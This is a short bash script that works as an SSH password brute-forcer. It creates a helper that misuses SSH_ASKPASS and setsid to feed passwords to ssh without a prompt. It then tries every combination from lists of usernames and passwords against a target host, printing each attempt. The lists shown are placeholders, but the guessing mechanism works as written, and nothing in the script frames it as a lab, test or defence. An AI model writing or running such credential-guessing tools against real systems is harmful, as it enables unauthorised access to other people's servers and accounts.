#!/bin/bash

dependency() {
  echo "#!/bin/bash">pass
  echo "[[ \$1 =~ password: ]] && cat || SSH_ASKPASS="\$0" DISPLAY=nothing:0 exec setsid "\$@"">>pass
  chmod +x pass
}


main() {
  hosts="192.168.1.1"
  users="aye bee sea dee"
  passwords="alpha beta charlie delta"

  for host in $hosts; do
    for user in $users; do
      for password in $passwords; do
        echo $host $user $password
        echo $password|./pass ssh $user@$host 
      done
    done
  done
}


dependency
main
